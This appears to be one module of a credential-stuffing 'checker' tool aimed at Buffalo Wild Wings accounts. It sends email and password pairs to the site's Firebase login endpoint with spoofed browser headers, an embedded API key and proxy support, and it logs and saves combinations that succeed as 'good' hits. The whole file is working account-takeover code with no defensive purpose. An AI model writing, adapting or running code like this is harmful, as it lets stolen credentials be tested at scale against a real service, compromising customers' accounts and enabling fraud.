from __main__ import checker
from requests import post
from modules.functions import log,save,set_proxy,bad_proxy

def check(email:str,password:str):
    retries = 0
    while retries != checker.retries:
        headers = {
            "Origin": "https://www.buffalowildwings.com" ,
            "Referer": "https://www.buffalowildwings.com/en/account/log-in/" ,
            "Sec-Fetch-Mode": "cors" ,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" ,
            "X-Client-Version": "Chrome/JsCore/6.6.2/FirebaseCore-web" ,
            "Content-Type":"application/json"
        }
        data = {"email":email,"password":password,"returnSecureToken":True}
        try:
            r = post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCmtykcZ6UTfD0vvJ05IpUVe94uIaUQdZ4",json=data,headers=headers,timeout=checker.timeout)
            if r.status_code == 400:
                retries += 1
            elif r.status_code == 200:
                if not checker.cui:
                    log("good",email+":"+password,"BWW")
                save("Buffalo Wild Wings","good",checker.time,email+":"+password)
                checker.good += 1
                checker.cpm += 1
                return
            else:
                raise
        except:
            checker.retries += 1
    if not checker.cui:
        log("bad",email+":"+password,"BWW")
    checker.bad += 1
    checker.cpm += 1
    return